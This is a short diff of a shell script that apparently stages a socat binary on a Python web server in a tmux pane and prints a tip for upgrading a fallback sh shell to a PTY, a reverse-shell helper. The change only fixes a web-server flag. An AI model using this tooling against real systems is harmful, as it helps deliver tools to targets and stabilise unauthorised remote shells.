@@ -80,7 +80,7 @@ else
 fi
 EOF
 cp socat ${TEMP}
-tmux split-window -h "cd ${TEMP}; python3 -m http.server -d ${WEBPORT}"
+tmux split-window -h "cd ${TEMP}; python3 -m http.server ${WEBPORT}"
 
 echo "[+] If sh has been used (fallback) , upgrade to pty with"
 echo "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
